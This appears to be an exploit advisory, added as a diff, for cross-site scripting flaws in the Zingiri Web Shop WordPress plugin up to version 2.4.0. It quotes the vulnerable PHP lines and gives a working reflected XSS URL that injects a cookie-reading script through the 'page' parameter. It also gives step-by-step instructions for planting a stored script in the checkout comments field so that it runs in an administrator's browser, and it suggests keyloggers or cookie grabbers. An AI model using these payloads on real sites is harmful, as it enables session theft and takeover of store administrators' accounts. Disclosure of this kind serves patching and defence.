@@ -1,0 +1,82 @@
+##############################################################################
+Wordpress Zingiri Web Shop Plugin <= 2.4.0 Multiple XSS Vulnerabilities
+
+author...............: Mehmet Ince
+twitte...............: https://twitter.com/#!/mmetince
+mail.................: mehmet.ince@bga.com.tr
+software link........: http://www.zingiri.com
+affected versions....: tested on 2.3.0 and 2.4.0
+# Exploit Title: Wordpress Zingiri Web Shop Plugin <= 2.4.0 Multiple XSS
+Vulnerabilities
+# Google Dork:
+# Date: 26 Apr 2012
+# Author: Mehmet INCE
+# Software Link:
+http://downloads.wordpress.org/plugin/zingiri-web-shop.2.4.0.zip
+# Version: 2.4.0 and older.
+# Tested on: version of 2.3.0 and 2.4.0 with Ubuntu 11.10 Server with
+Firefox browser.
+##############################################################################
+/*
+## BASIC XSS
+PS: Exploitable without Authentication
+
+plugins/zingiri-web-shop/zing.inc.php
+
+line at 401.
+
+if ($process=='content' && $page!='ajax' && $page!='downldr') echo '<div
+class="zing_ws_page" id="zing_ws_'.$_GET['page'].'">';
+
+Exploit:
+http://localhost/wordpress/?page=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+'page' variable isn't properly sanitized before being used.
+
+
+## STORED XSS
+PS: Attacker should be logged for exploit.
+./fws/pages-front/onecheckout.php
+
+line 27-29
+if (!empty($_POST['notes'])) {
+$notes=$_POST['notes'];
+}
+
+and line 348
+<textarea name="notes" rows="5" style="width: 100%"><?php echo
+$notes;?>&lt;/textarea&gt;<br />
+
+'notes' variable isn't properly sanitized before being used.
+
+That's very basic XSS vulnerabilities. But you dont need use fishing attack
+to target webpage's administrator. That application insert datas to
+database with that form. After your malicious code posted up, your
+javascrip code inserted to database with $_POST['notes'] variable. When
+administrator wanna see list of ordered items list. Javascript codes will
+come from database and start working on Authenticated admin user side.
+After that You can use browser keylogger with BT5 tools or can usee cookie
+grabber.
+*/
+
+step 1: Login to wordpress.
+
+step 2: Go to "Shop" menu. It's should be stay at banner.
+
+http://6.6.6.102/wordpress/?page_id=14
+
+step 3: Than you'll see list ot items. Click one of them.
+
+http://6.6.6.102/wordpress/?page=details&prod=2&cat=1&page_id=14
+
+step 4: You can pass that form action. That wont be problem..! Click to
+"Order" button.
+
+step 5: There is confirmation about the Shopping. Click "checkout" to pass
+that page.
+
+step 6: It's final stage. Put you javascript payload to "Additional
+comments/questions" form. After you click checkout button, that form will
+get all of these input data with POST method.
+
+step 7: Click to "Checkout"
